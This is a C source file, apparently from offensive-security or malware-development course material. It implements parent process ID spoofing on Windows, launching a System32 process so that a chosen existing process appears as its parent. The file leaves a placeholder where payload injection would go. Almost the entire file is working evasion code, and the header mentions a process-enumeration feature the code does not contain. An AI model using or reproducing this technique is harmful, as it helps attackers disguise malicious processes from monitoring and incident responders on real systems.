// Add process enumeration functionality into the PPID function to programmatically fetch a parent process's handle.

#include <Windows.h>
#include <stdio.h>

// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)


#define TARGET_PROCESS		"ProcessHacker.exe"

/*
Parameters:

	- hParentProcess; handle to the process you want to be the parent of the created process
	- lpProcessName; a process name under '\System32\' to create
	- dwProcessId; outputted process id (of the newly created process)
	- hProcess; outputted process handle (of the newly created process)
	- hThread; outputted main thread handle (of the newly created process)

Creates a new process `lpProcessName`, forcing `hParentProcess` to look like its parent

*/

BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR					lpPath		[MAX_PATH * 2];
	CHAR					CurrentDir	[MAX_PATH];
	CHAR					WnDr		[MAX_PATH];

	SIZE_T							sThreadAttList	= NULL;
	PPROC_THREAD_ATTRIBUTE_LIST		pThreadAttList	= NULL;

	STARTUPINFOEXA			SiEx	= { 0 };
	PROCESS_INFORMATION		Pi		= { 0 };

	// cleaning the structs (setting elements values to 0)
	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// setting the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// getting the %windir% system variable path (this is 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// making the target process path
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

	// making the `lpCurrentDirectory` parameter in CreateProcessA
	sprintf(CurrentDir, "%s\\System32\\", WnDr);


//-------------------------------------------------------------------------------

	// this will fail with ERROR_INSUFFICIENT_BUFFER / 122
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

	// allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL){
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// calling InitializeProcThreadAttributeList again passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// setting the `LPPROC_THREAD_ATTRIBUTE_LIST` element in `SiEx` to be equal to what was
	// created using `UpdateProcThreadAttribute` - that is the parent process
	SiEx.lpAttributeList = pThreadAttList;

//-------------------------------------------------------------------------------

	printf("[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		CurrentDir,
		&SiEx.StartupInfo,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");


	// filling up the OUTPUT parameter with 'CreateProcessA's output'
	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;


	// cleaning up
	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	// doing a small check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}



int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("[!] Missing \"Parent Process Id\" Argument \n");
		return -1;
	}
	DWORD		dwPPid			= atoi(argv[1]),
				dwProcessId		= NULL;

	HANDLE		hPProcess		= NULL,
				hProcess		= NULL,
				hThread			= NULL;

	// openning a handle to the parent process
	if ((hPProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPPid)) == NULL) {
		printf("[!] OpenProcess Failed with Error : %d \n", GetLastError());
		return -1;
	}


	printf("[i] Spawning Target Process \"%s\" With Parent : %d \n", TARGET_PROCESS, dwPPid);
	if (!CreatePPidSpoofedProcess(hPProcess, TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	printf("[i] Target Process Created With Pid : %d \n", dwProcessId);

	/*
	
		payload injection code here (for example)
	
	*/

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);
	
	return 0;
}






















